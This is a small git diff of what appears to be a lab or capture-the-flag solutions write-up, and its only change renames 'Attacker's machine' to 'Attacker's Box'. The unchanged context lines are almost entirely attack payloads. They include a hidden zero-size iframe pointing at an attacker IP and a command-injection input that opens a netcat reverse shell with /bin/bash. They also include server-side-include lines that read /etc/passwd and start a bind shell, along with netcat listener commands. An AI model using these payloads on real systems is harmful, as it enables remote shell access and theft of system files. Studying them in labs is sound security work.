@@ -24,7 +24,7 @@ Following solution taken from:
 ```
 <div class="code"><iframe SRC="http://192.168.200.130:775" height="0" width="0"></iframe></div>
 ```
-Attacker's machine:
+Attacker's Box:
 ```
 nc -lvp 775
 ```
@@ -37,7 +37,7 @@ nc -lvp 775
 127.0.0.1 && nc -vn 192.168.254.128 775 -e /bin/bash
 ```
 
-Attacker's machine:
+Attacker's Box:
 ```
 nc -lvp 775
 ```
@@ -60,7 +60,7 @@ nc -lvp 775
 <!--#echo var="DATE_LOCAL" -->
 <!--#exec cmd="cat /etc/passwd" -->
 <!--#exec cmd="nc -lvp 775 -e /bin/bash" -->
-Attacker's machine:
+Attacker's Box:
 ```
 nc -nv 192.168.200.150 775
 
